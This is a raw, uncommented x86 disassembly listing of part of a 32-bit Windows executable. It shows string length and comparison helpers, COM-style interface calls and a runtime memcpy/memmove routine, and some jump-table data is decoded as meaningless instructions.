  40c314:	89 04 0f             	mov    %eax,(%edi,%ecx,1)
  40c317:	8b 06                	mov    (%esi),%eax
  40c319:	83 3c 07 00          	cmpl   $0x0,(%edi,%eax,1)
  40c31d:	74 21                	je     0x40c340
  40c31f:	8b 06                	mov    (%esi),%eax
  40c321:	03 f8                	add    %eax,%edi
  40c323:	83 3f 00             	cmpl   $0x0,(%edi)
  40c326:	74 07                	je     0x40c32f
  40c328:	8b 3f                	mov    (%edi),%edi
  40c32a:	e8 68 fd ff ff       	call   0x40c097
  40c32f:	ff 45 fc             	incl   -0x4(%ebp)
  40c332:	3b 5d f8             	cmp    -0x8(%ebp),%ebx
  40c335:	0f 82 7b ff ff ff    	jb     0x40c2b6
  40c33b:	e9 6e ff ff ff       	jmp    0x40c2ae
  40c340:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c343:	8b fe                	mov    %esi,%edi
  40c345:	e8 0a fb ff ff       	call   0x40be54
  40c34a:	83 c8 ff             	or     $0xffffffff,%eax
  40c34d:	e9 5f ff ff ff       	jmp    0x40c2b1
  40c352:	33 c0                	xor    %eax,%eax
  40c354:	85 c9                	test   %ecx,%ecx
  40c356:	74 0b                	je     0x40c363
  40c358:	38 01                	cmp    %al,(%ecx)
  40c35a:	74 07                	je     0x40c363
  40c35c:	40                   	inc    %eax
  40c35d:	80 3c 08 00          	cmpb   $0x0,(%eax,%ecx,1)
  40c361:	75 f9                	jne    0x40c35c
  40c363:	c3                   	ret
  40c364:	33 c0                	xor    %eax,%eax
  40c366:	85 c9                	test   %ecx,%ecx
  40c368:	74 0d                	je     0x40c377
  40c36a:	66 39 01             	cmp    %ax,(%ecx)
  40c36d:	74 08                	je     0x40c377
  40c36f:	40                   	inc    %eax
  40c370:	66 83 3c 41 00       	cmpw   $0x0,(%ecx,%eax,2)
  40c375:	75 f8                	jne    0x40c36f
  40c377:	c3                   	ret
  40c378:	85 c9                	test   %ecx,%ecx
  40c37a:	56                   	push   %esi
  40c37b:	57                   	push   %edi
  40c37c:	8b f8                	mov    %eax,%edi
  40c37e:	8b f2                	mov    %edx,%esi
  40c380:	75 09                	jne    0x40c38b
  40c382:	85 f6                	test   %esi,%esi
  40c384:	74 0e                	je     0x40c394
  40c386:	83 c8 ff             	or     $0xffffffff,%eax
  40c389:	eb 6b                	jmp    0x40c3f6
  40c38b:	85 f6                	test   %esi,%esi
  40c38d:	75 09                	jne    0x40c398
  40c38f:	33 c0                	xor    %eax,%eax
  40c391:	40                   	inc    %eax
  40c392:	eb 62                	jmp    0x40c3f6
  40c394:	33 c0                	xor    %eax,%eax
  40c396:	eb 5e                	jmp    0x40c3f6
  40c398:	83 ff ff             	cmp    $0xffffffff,%edi
  40c39b:	53                   	push   %ebx
  40c39c:	74 35                	je     0x40c3d3
  40c39e:	e8 c1 ff ff ff       	call   0x40c364
  40c3a3:	3b c7                	cmp    %edi,%eax
  40c3a5:	75 3b                	jne    0x40c3e2
  40c3a7:	85 c0                	test   %eax,%eax
  40c3a9:	74 37                	je     0x40c3e2
  40c3ab:	85 ff                	test   %edi,%edi
  40c3ad:	74 33                	je     0x40c3e2
  40c3af:	33 d2                	xor    %edx,%edx
  40c3b1:	85 ff                	test   %edi,%edi
  40c3b3:	7e 2f                	jle    0x40c3e4
  40c3b5:	0f b7 01             	movzwl (%ecx),%eax
  40c3b8:	0f b7 1e             	movzwl (%esi),%ebx
  40c3bb:	2b c3                	sub    %ebx,%eax
  40c3bd:	75 25                	jne    0x40c3e4
  40c3bf:	41                   	inc    %ecx
  40c3c0:	41                   	inc    %ecx
  40c3c1:	46                   	inc    %esi
  40c3c2:	46                   	inc    %esi
  40c3c3:	42                   	inc    %edx
  40c3c4:	3b d7                	cmp    %edi,%edx
  40c3c6:	7c ed                	jl     0x40c3b5
  40c3c8:	eb 1a                	jmp    0x40c3e4
  40c3ca:	66 85 d2             	test   %dx,%dx
  40c3cd:	74 15                	je     0x40c3e4
  40c3cf:	41                   	inc    %ecx
  40c3d0:	41                   	inc    %ecx
  40c3d1:	46                   	inc    %esi
  40c3d2:	46                   	inc    %esi
  40c3d3:	0f b7 16             	movzwl (%esi),%edx
  40c3d6:	0f b7 01             	movzwl (%ecx),%eax
  40c3d9:	0f b7 fa             	movzwl %dx,%edi
  40c3dc:	2b c7                	sub    %edi,%eax
  40c3de:	74 ea                	je     0x40c3ca
  40c3e0:	eb 02                	jmp    0x40c3e4
  40c3e2:	2b c7                	sub    %edi,%eax
  40c3e4:	33 c9                	xor    %ecx,%ecx
  40c3e6:	85 c0                	test   %eax,%eax
  40c3e8:	0f 9f c1             	setg   %cl
  40c3eb:	f7 d8                	neg    %eax
  40c3ed:	1b c0                	sbb    %eax,%eax
  40c3ef:	5b                   	pop    %ebx
  40c3f0:	8d 4c 09 ff          	lea    -0x1(%ecx,%ecx,1),%ecx
  40c3f4:	23 c1                	and    %ecx,%eax
  40c3f6:	5f                   	pop    %edi
  40c3f7:	5e                   	pop    %esi
  40c3f8:	c3                   	ret
  40c3f9:	85 d2                	test   %edx,%edx
  40c3fb:	53                   	push   %ebx
  40c3fc:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  40c400:	7f 05                	jg     0x40c407
  40c402:	83 c8 ff             	or     $0xffffffff,%eax
  40c405:	5b                   	pop    %ebx
  40c406:	c3                   	ret
  40c407:	56                   	push   %esi
  40c408:	8d 34 12             	lea    (%edx,%edx,1),%esi
  40c40b:	56                   	push   %esi
  40c40c:	57                   	push   %edi
  40c40d:	e8 7b fa ff ff       	call   0x40be8d
  40c412:	59                   	pop    %ecx
  40c413:	59                   	pop    %ecx
  40c414:	8d 44 24 10          	lea    0x10(%esp),%eax
  40c418:	50                   	push   %eax
  40c419:	53                   	push   %ebx
  40c41a:	52                   	push   %edx
  40c41b:	57                   	push   %edi
  40c41c:	ff 15 28 e1 40 00    	call   *0x40e128
  40c422:	66 83 64 3e fe 00    	andw   $0x0,-0x2(%esi,%edi,1)
  40c428:	83 f8 ff             	cmp    $0xffffffff,%eax
  40c42b:	5e                   	pop    %esi
  40c42c:	75 08                	jne    0x40c436
  40c42e:	8b cf                	mov    %edi,%ecx
  40c430:	5b                   	pop    %ebx
  40c431:	e9 2e ff ff ff       	jmp    0x40c364
  40c436:	66 83 24 47 00       	andw   $0x0,(%edi,%eax,2)
  40c43b:	5b                   	pop    %ebx
  40c43c:	c3                   	ret
  40c43d:	55                   	push   %ebp
  40c43e:	8b ec                	mov    %esp,%ebp
  40c440:	51                   	push   %ecx
  40c441:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40c445:	56                   	push   %esi
  40c446:	8d 45 10             	lea    0x10(%ebp),%eax
  40c449:	50                   	push   %eax
  40c44a:	ff 75 0c             	push   0xc(%ebp)
  40c44d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40c450:	e8 0b fb ff ff       	call   0x40bf60
  40c455:	8b f0                	mov    %eax,%esi
  40c457:	85 f6                	test   %esi,%esi
  40c459:	59                   	pop    %ecx
  40c45a:	59                   	pop    %ecx
  40c45b:	7d 0b                	jge    0x40c468
  40c45d:	ff 75 fc             	push   -0x4(%ebp)
  40c460:	e8 d5 f9 ff ff       	call   0x40be3a
  40c465:	59                   	pop    %ecx
  40c466:	eb 08                	jmp    0x40c470
  40c468:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c46b:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40c46e:	89 01                	mov    %eax,(%ecx)
  40c470:	8b c6                	mov    %esi,%eax
  40c472:	5e                   	pop    %esi
  40c473:	c9                   	leave
  40c474:	c3                   	ret
  40c475:	85 c0                	test   %eax,%eax
  40c477:	74 19                	je     0x40c492
  40c479:	83 f9 02             	cmp    $0x2,%ecx
  40c47c:	72 14                	jb     0x40c492
  40c47e:	66 83 7c 48 fe 00    	cmpw   $0x0,-0x2(%eax,%ecx,2)
  40c484:	75 0c                	jne    0x40c492
  40c486:	66 83 7c 48 fc 00    	cmpw   $0x0,-0x4(%eax,%ecx,2)
  40c48c:	75 04                	jne    0x40c492
  40c48e:	33 c0                	xor    %eax,%eax
  40c490:	40                   	inc    %eax
  40c491:	c3                   	ret
  40c492:	33 c0                	xor    %eax,%eax
  40c494:	c3                   	ret
  40c495:	33 d2                	xor    %edx,%edx
  40c497:	66 83 39 00          	cmpw   $0x0,(%ecx)
  40c49b:	75 10                	jne    0x40c4ad
  40c49d:	8d 41 02             	lea    0x2(%ecx),%eax
  40c4a0:	66 83 38 00          	cmpw   $0x0,(%eax)
  40c4a4:	74 0b                	je     0x40c4b1
  40c4a6:	42                   	inc    %edx
  40c4a7:	3b 54 24 04          	cmp    0x4(%esp),%edx
  40c4ab:	74 06                	je     0x40c4b3
  40c4ad:	41                   	inc    %ecx
  40c4ae:	41                   	inc    %ecx
  40c4af:	eb e6                	jmp    0x40c497
  40c4b1:	33 c0                	xor    %eax,%eax
  40c4b3:	c3                   	ret
  40c4b4:	55                   	push   %ebp
  40c4b5:	8b ec                	mov    %esp,%ebp
  40c4b7:	51                   	push   %ecx
  40c4b8:	56                   	push   %esi
  40c4b9:	57                   	push   %edi
  40c4ba:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40c4bd:	50                   	push   %eax
  40c4be:	68 c8 e1 40 00       	push   $0x40e1c8
  40c4c3:	68 01 44 00 00       	push   $0x4401
  40c4c8:	33 ff                	xor    %edi,%edi
  40c4ca:	57                   	push   %edi
  40c4cb:	68 b8 e1 40 00       	push   $0x40e1b8
  40c4d0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  40c4d3:	ff 15 a4 e1 40 00    	call   *0x40e1a4
  40c4d9:	85 c0                	test   %eax,%eax
  40c4db:	75 07                	jne    0x40c4e4
  40c4dd:	8b 75 fc             	mov    -0x4(%ebp),%esi
  40c4e0:	3b f7                	cmp    %edi,%esi
  40c4e2:	75 06                	jne    0x40c4ea
  40c4e4:	33 f6                	xor    %esi,%esi
  40c4e6:	3b f7                	cmp    %edi,%esi
  40c4e8:	74 29                	je     0x40c513
  40c4ea:	8b 06                	mov    (%esi),%eax
  40c4ec:	57                   	push   %edi
  40c4ed:	56                   	push   %esi
  40c4ee:	ff 90 fc 00 00 00    	call   *0xfc(%eax)
  40c4f4:	8b 06                	mov    (%esi),%eax
  40c4f6:	57                   	push   %edi
  40c4f7:	56                   	push   %esi
  40c4f8:	ff 90 20 01 00 00    	call   *0x120(%eax)
  40c4fe:	8b 06                	mov    (%esi),%eax
  40c500:	57                   	push   %edi
  40c501:	56                   	push   %esi
  40c502:	ff 90 18 01 00 00    	call   *0x118(%eax)
  40c508:	8b 06                	mov    (%esi),%eax
  40c50a:	6a ff                	push   $0xffffffff
  40c50c:	56                   	push   %esi
  40c50d:	ff 90 10 01 00 00    	call   *0x110(%eax)
  40c513:	5f                   	pop    %edi
  40c514:	8b c6                	mov    %esi,%eax
  40c516:	5e                   	pop    %esi
  40c517:	c9                   	leave
  40c518:	c3                   	ret
  40c519:	55                   	push   %ebp
  40c51a:	8b ec                	mov    %esp,%ebp
  40c51c:	83 ec 20             	sub    $0x20,%esp
  40c51f:	53                   	push   %ebx
  40c520:	56                   	push   %esi
  40c521:	57                   	push   %edi
  40c522:	c6 45 fb 00          	movb   $0x0,-0x5(%ebp)
  40c526:	e8 89 ff ff ff       	call   0x40c4b4
  40c52b:	8b d8                	mov    %eax,%ebx
  40c52d:	85 db                	test   %ebx,%ebx
  40c52f:	74 60                	je     0x40c591
  40c531:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c534:	50                   	push   %eax
  40c535:	ff 15 04 e1 40 00    	call   *0x40e104
  40c53b:	ff 75 08             	push   0x8(%ebp)
  40c53e:	66 c7 45 e4 08 00    	movw   $0x8,-0x1c(%ebp)
  40c544:	ff 15 08 e1 40 00    	call   *0x40e108
  40c54a:	85 c0                	test   %eax,%eax
  40c54c:	89 45 ec             	mov    %eax,-0x14(%ebp)
  40c54f:	74 38                	je     0x40c589
  40c551:	8b 03                	mov    (%ebx),%eax
  40c553:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40c556:	51                   	push   %ecx
  40c557:	83 ec 10             	sub    $0x10,%esp
  40c55a:	8b fc                	mov    %esp,%edi
  40c55c:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  40c55f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c560:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c561:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c562:	53                   	push   %ebx
  40c563:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40c564:	ff 90 e8 00 00 00    	call   *0xe8(%eax)
  40c56a:	85 c0                	test   %eax,%eax
  40c56c:	75 0b                	jne    0x40c579
  40c56e:	66 83 7d f4 ff       	cmpw   $0xffff,-0xc(%ebp)
  40c573:	75 04                	jne    0x40c579
  40c575:	c6 45 fb 01          	movb   $0x1,-0x5(%ebp)
  40c579:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c57c:	50                   	push   %eax
  40c57d:	ff 15 0c e1 40 00    	call   *0x40e10c
  40c583:	80 7d fb 00          	cmpb   $0x0,-0x5(%ebp)
  40c587:	75 08                	jne    0x40c591
  40c589:	8b 03                	mov    (%ebx),%eax
  40c58b:	53                   	push   %ebx
  40c58c:	ff 50 08             	call   *0x8(%eax)
  40c58f:	33 db                	xor    %ebx,%ebx
  40c591:	5f                   	pop    %edi
  40c592:	5e                   	pop    %esi
  40c593:	8b c3                	mov    %ebx,%eax
  40c595:	5b                   	pop    %ebx
  40c596:	c9                   	leave
  40c597:	c3                   	ret
  40c598:	55                   	push   %ebp
  40c599:	8b ec                	mov    %esp,%ebp
  40c59b:	51                   	push   %ecx
  40c59c:	8b 06                	mov    (%esi),%eax
  40c59e:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40c5a1:	51                   	push   %ecx
  40c5a2:	56                   	push   %esi
  40c5a3:	ff 50 68             	call   *0x68(%eax)
  40c5a6:	85 c0                	test   %eax,%eax
  40c5a8:	74 04                	je     0x40c5ae
  40c5aa:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40c5ae:	8b 06                	mov    (%esi),%eax
  40c5b0:	56                   	push   %esi
  40c5b1:	ff 50 08             	call   *0x8(%eax)
  40c5b4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40c5b7:	c9                   	leave
  40c5b8:	c3                   	ret
  40c5b9:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  40c5be:	74 0a                	je     0x40c5ca
  40c5c0:	ff 74 24 04          	push   0x4(%esp)
  40c5c4:	ff 15 00 e1 40 00    	call   *0x40e100
  40c5ca:	c3                   	ret
  40c5cb:	cc                   	int3
  40c5cc:	cc                   	int3
  40c5cd:	cc                   	int3
  40c5ce:	cc                   	int3
  40c5cf:	cc                   	int3
  40c5d0:	55                   	push   %ebp
  40c5d1:	8b ec                	mov    %esp,%ebp
  40c5d3:	57                   	push   %edi
  40c5d4:	56                   	push   %esi
  40c5d5:	8b 75 0c             	mov    0xc(%ebp),%esi
  40c5d8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40c5db:	8b 7d 08             	mov    0x8(%ebp),%edi
  40c5de:	8b c1                	mov    %ecx,%eax
  40c5e0:	8b d1                	mov    %ecx,%edx
  40c5e2:	03 c6                	add    %esi,%eax
  40c5e4:	3b fe                	cmp    %esi,%edi
  40c5e6:	76 08                	jbe    0x40c5f0
  40c5e8:	3b f8                	cmp    %eax,%edi
  40c5ea:	0f 82 a4 01 00 00    	jb     0x40c794
  40c5f0:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40c5f6:	72 1f                	jb     0x40c617
  40c5f8:	83 3d 28 81 42 00 00 	cmpl   $0x0,0x428128
  40c5ff:	74 16                	je     0x40c617
  40c601:	57                   	push   %edi
  40c602:	56                   	push   %esi
  40c603:	83 e7 0f             	and    $0xf,%edi
  40c606:	83 e6 0f             	and    $0xf,%esi
  40c609:	3b fe                	cmp    %esi,%edi
  40c60b:	5e                   	pop    %esi
  40c60c:	5f                   	pop    %edi
  40c60d:	75 08                	jne    0x40c617
  40c60f:	5e                   	pop    %esi
  40c610:	5f                   	pop    %edi
  40c611:	5d                   	pop    %ebp
  40c612:	e9 a5 03 00 00       	jmp    0x40c9bc
  40c617:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40c61d:	75 15                	jne    0x40c634
  40c61f:	c1 e9 02             	shr    $0x2,%ecx
  40c622:	83 e2 03             	and    $0x3,%edx
  40c625:	83 f9 08             	cmp    $0x8,%ecx
  40c628:	72 2a                	jb     0x40c654
  40c62a:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c62c:	ff 24 95 44 c7 40 00 	jmp    *0x40c744(,%edx,4)
  40c633:	90                   	nop
  40c634:	8b c7                	mov    %edi,%eax
  40c636:	ba 03 00 00 00       	mov    $0x3,%edx
  40c63b:	83 e9 04             	sub    $0x4,%ecx
  40c63e:	72 0c                	jb     0x40c64c
  40c640:	83 e0 03             	and    $0x3,%eax
  40c643:	03 c8                	add    %eax,%ecx
  40c645:	ff 24 85 58 c6 40 00 	jmp    *0x40c658(,%eax,4)
  40c64c:	ff 24 8d 54 c7 40 00 	jmp    *0x40c754(,%ecx,4)
  40c653:	90                   	nop
  40c654:	ff 24 8d d8 c6 40 00 	jmp    *0x40c6d8(,%ecx,4)
  40c65b:	90                   	nop
  40c65c:	68 c6 40 00 94       	push   $0x940040c6
  40c661:	c6 40 00 b8          	movb   $0xb8,0x0(%eax)
  40c665:	c6 40 00 23          	movb   $0x23,0x0(%eax)
  40c669:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  40c66f:	46                   	inc    %esi
  40c670:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  40c676:	02 c1                	add    %cl,%al
  40c678:	e9 02 88 47 02       	jmp    0x2884e7f
  40c67d:	83 c6 03             	add    $0x3,%esi
  40c680:	83 c7 03             	add    $0x3,%edi
  40c683:	83 f9 08             	cmp    $0x8,%ecx
  40c686:	72 cc                	jb     0x40c654
  40c688:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c68a:	ff 24 95 44 c7 40 00 	jmp    *0x40c744(,%edx,4)
  40c691:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c694:	23 d1                	and    %ecx,%edx
  40c696:	8a 06                	mov    (%esi),%al
  40c698:	88 07                	mov    %al,(%edi)
  40c69a:	8a 46 01             	mov    0x1(%esi),%al
  40c69d:	c1 e9 02             	shr    $0x2,%ecx
  40c6a0:	88 47 01             	mov    %al,0x1(%edi)
  40c6a3:	83 c6 02             	add    $0x2,%esi
  40c6a6:	83 c7 02             	add    $0x2,%edi
  40c6a9:	83 f9 08             	cmp    $0x8,%ecx
  40c6ac:	72 a6                	jb     0x40c654
  40c6ae:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c6b0:	ff 24 95 44 c7 40 00 	jmp    *0x40c744(,%edx,4)
  40c6b7:	90                   	nop
  40c6b8:	23 d1                	and    %ecx,%edx
  40c6ba:	8a 06                	mov    (%esi),%al
  40c6bc:	88 07                	mov    %al,(%edi)
  40c6be:	83 c6 01             	add    $0x1,%esi
  40c6c1:	c1 e9 02             	shr    $0x2,%ecx
  40c6c4:	83 c7 01             	add    $0x1,%edi
  40c6c7:	83 f9 08             	cmp    $0x8,%ecx
  40c6ca:	72 88                	jb     0x40c654
  40c6cc:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c6ce:	ff 24 95 44 c7 40 00 	jmp    *0x40c744(,%edx,4)
  40c6d5:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c6d8:	3b c7                	cmp    %edi,%eax
  40c6da:	40                   	inc    %eax
  40c6db:	00 28                	add    %ch,(%eax)
  40c6dd:	c7 40 00 20 c7 40 00 	movl   $0x40c720,0x0(%eax)
  40c6e4:	18 c7                	sbb    %al,%bh
  40c6e6:	40                   	inc    %eax
  40c6e7:	00 10                	add    %dl,(%eax)
  40c6e9:	c7 40 00 08 c7 40 00 	movl   $0x40c708,0x0(%eax)
  40c6f0:	00 c7                	add    %al,%bh
  40c6f2:	40                   	inc    %eax
  40c6f3:	00 f8                	add    %bh,%al
  40c6f5:	c6 40 00 8b          	movb   $0x8b,0x0(%eax)
  40c6f9:	44                   	inc    %esp
  40c6fa:	8e e4                	mov    %esp,%fs
  40c6fc:	89 44 8f e4          	mov    %eax,-0x1c(%edi,%ecx,4)
  40c700:	8b 44 8e e8          	mov    -0x18(%esi,%ecx,4),%eax
  40c704:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40c708:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  40c70c:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  40c710:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  40c714:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  40c718:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  40c71c:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  40c720:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  40c724:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  40c728:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  40c72c:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  40c730:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40c737:	03 f0                	add    %eax,%esi
  40c739:	03 f8                	add    %eax,%edi
  40c73b:	ff 24 95 44 c7 40 00 	jmp    *0x40c744(,%edx,4)
  40c742:	8b ff                	mov    %edi,%edi
  40c744:	54                   	push   %esp
  40c745:	c7 40 00 5c c7 40 00 	movl   $0x40c75c,0x0(%eax)
  40c74c:	68 c7 40 00 7c       	push   $0x7c0040c7
  40c751:	c7 40 00 8b 45 08 5e 	movl   $0x5e08458b,0x0(%eax)
  40c758:	5f                   	pop    %edi
  40c759:	c9                   	leave
  40c75a:	c3                   	ret
  40c75b:	90                   	nop
  40c75c:	8a 06                	mov    (%esi),%al
  40c75e:	88 07                	mov    %al,(%edi)
  40c760:	8b 45 08             	mov    0x8(%ebp),%eax
  40c763:	5e                   	pop    %esi
  40c764:	5f                   	pop    %edi
  40c765:	c9                   	leave
  40c766:	c3                   	ret
  40c767:	90                   	nop
  40c768:	8a 06                	mov    (%esi),%al
  40c76a:	88 07                	mov    %al,(%edi)
  40c76c:	8a 46 01             	mov    0x1(%esi),%al
  40c76f:	88 47 01             	mov    %al,0x1(%edi)
  40c772:	8b 45 08             	mov    0x8(%ebp),%eax
  40c775:	5e                   	pop    %esi
  40c776:	5f                   	pop    %edi
  40c777:	c9                   	leave
  40c778:	c3                   	ret
  40c779:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c77c:	8a 06                	mov    (%esi),%al
  40c77e:	88 07                	mov    %al,(%edi)
  40c780:	8a 46 01             	mov    0x1(%esi),%al
  40c783:	88 47 01             	mov    %al,0x1(%edi)
  40c786:	8a 46 02             	mov    0x2(%esi),%al
  40c789:	88 47 02             	mov    %al,0x2(%edi)
  40c78c:	8b 45 08             	mov    0x8(%ebp),%eax
  40c78f:	5e                   	pop    %esi
  40c790:	5f                   	pop    %edi
  40c791:	c9                   	leave
  40c792:	c3                   	ret
  40c793:	90                   	nop
  40c794:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  40c798:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  40c79c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  40c7a2:	75 24                	jne    0x40c7c8
  40c7a4:	c1 e9 02             	shr    $0x2,%ecx
  40c7a7:	83 e2 03             	and    $0x3,%edx
  40c7aa:	83 f9 08             	cmp    $0x8,%ecx
  40c7ad:	72 0d                	jb     0x40c7bc
  40c7af:	fd                   	std
  40c7b0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c7b2:	fc                   	cld
  40c7b3:	ff 24 95 e0 c8 40 00 	jmp    *0x40c8e0(,%edx,4)
  40c7ba:	8b ff                	mov    %edi,%edi
  40c7bc:	f7 d9                	neg    %ecx
  40c7be:	ff 24 8d 90 c8 40 00 	jmp    *0x40c890(,%ecx,4)
  40c7c5:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c7c8:	8b c7                	mov    %edi,%eax
  40c7ca:	ba 03 00 00 00       	mov    $0x3,%edx
  40c7cf:	83 f9 04             	cmp    $0x4,%ecx
  40c7d2:	72 0c                	jb     0x40c7e0
  40c7d4:	83 e0 03             	and    $0x3,%eax
  40c7d7:	2b c8                	sub    %eax,%ecx
  40c7d9:	ff 24 85 e4 c7 40 00 	jmp    *0x40c7e4(,%eax,4)
  40c7e0:	ff 24 8d e0 c8 40 00 	jmp    *0x40c8e0(,%ecx,4)
  40c7e7:	90                   	nop
  40c7e8:	f4                   	hlt
  40c7e9:	c7 40 00 18 c8 40 00 	movl   $0x40c818,0x0(%eax)
  40c7f0:	40                   	inc    %eax
  40c7f1:	c8 40 00 8a          	enter  $0x40,$0x8a
  40c7f5:	46                   	inc    %esi
  40c7f6:	03 23                	add    (%ebx),%esp
  40c7f8:	d1 88 47 03 83 ee    	rorl   $1,-0x117cfcb9(%eax)
  40c7fe:	01 c1                	add    %eax,%ecx
  40c800:	e9 02 83 ef 01       	jmp    0x2304b07
  40c805:	83 f9 08             	cmp    $0x8,%ecx
  40c808:	72 b2                	jb     0x40c7bc
  40c80a:	fd                   	std
  40c80b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c80d:	fc                   	cld
  40c80e:	ff 24 95 e0 c8 40 00 	jmp    *0x40c8e0(,%edx,4)
  40c815:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c818:	8a 46 03             	mov    0x3(%esi),%al
  40c81b:	23 d1                	and    %ecx,%edx
  40c81d:	88 47 03             	mov    %al,0x3(%edi)
  40c820:	8a 46 02             	mov    0x2(%esi),%al
  40c823:	c1 e9 02             	shr    $0x2,%ecx
  40c826:	88 47 02             	mov    %al,0x2(%edi)
  40c829:	83 ee 02             	sub    $0x2,%esi
  40c82c:	83 ef 02             	sub    $0x2,%edi
  40c82f:	83 f9 08             	cmp    $0x8,%ecx
  40c832:	72 88                	jb     0x40c7bc
  40c834:	fd                   	std
  40c835:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c837:	fc                   	cld
  40c838:	ff 24 95 e0 c8 40 00 	jmp    *0x40c8e0(,%edx,4)
  40c83f:	90                   	nop
  40c840:	8a 46 03             	mov    0x3(%esi),%al
  40c843:	23 d1                	and    %ecx,%edx
  40c845:	88 47 03             	mov    %al,0x3(%edi)
  40c848:	8a 46 02             	mov    0x2(%esi),%al
  40c84b:	88 47 02             	mov    %al,0x2(%edi)
  40c84e:	8a 46 01             	mov    0x1(%esi),%al
  40c851:	c1 e9 02             	shr    $0x2,%ecx
  40c854:	88 47 01             	mov    %al,0x1(%edi)
  40c857:	83 ee 03             	sub    $0x3,%esi
  40c85a:	83 ef 03             	sub    $0x3,%edi
  40c85d:	83 f9 08             	cmp    $0x8,%ecx
  40c860:	0f 82 56 ff ff ff    	jb     0x40c7bc
  40c866:	fd                   	std
  40c867:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40c869:	fc                   	cld
  40c86a:	ff 24 95 e0 c8 40 00 	jmp    *0x40c8e0(,%edx,4)
  40c871:	8d 49 00             	lea    0x0(%ecx),%ecx
  40c874:	94                   	xchg   %eax,%esp
  40c875:	c8 40 00 9c          	enter  $0x40,$0x9c
  40c879:	c8 40 00 a4          	enter  $0x40,$0xa4
  40c87d:	c8 40 00 ac          	enter  $0x40,$0xac
  40c881:	c8 40 00 b4          	enter  $0x40,$0xb4
  40c885:	c8 40 00 bc          	enter  $0x40,$0xbc
  40c889:	c8 40 00 c4          	enter  $0x40,$0xc4
  40c88d:	c8 40 00 d7          	enter  $0x40,$0xd7
  40c891:	c8 40 00 8b          	enter  $0x40,$0x8b
  40c895:	44                   	inc    %esp
  40c896:	8e 1c 89             	mov    (%ecx,%ecx,4),%ds
  40c899:	44                   	inc    %esp
  40c89a:	8f                   	(bad)
  40c89b:	1c 8b                	sbb    $0x8b,%al
  40c89d:	44                   	inc    %esp
  40c89e:	8e 18                	mov    (%eax),%ds
  40c8a0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  40c8a4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  40c8a8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  40c8ac:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  40c8b0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  40c8b4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  40c8b8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  40c8bc:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  40c8c0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  40c8c4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  40c8c8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  40c8cc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40c8d3:	03 f0                	add    %eax,%esi
  40c8d5:	03 f8                	add    %eax,%edi
  40c8d7:	ff 24 95 e0 c8 40 00 	jmp    *0x40c8e0(,%edx,4)
  40c8de:	8b ff                	mov    %edi,%edi
  40c8e0:	f0 c8 40 00 f8       	lock enter $0x40,$0xf8
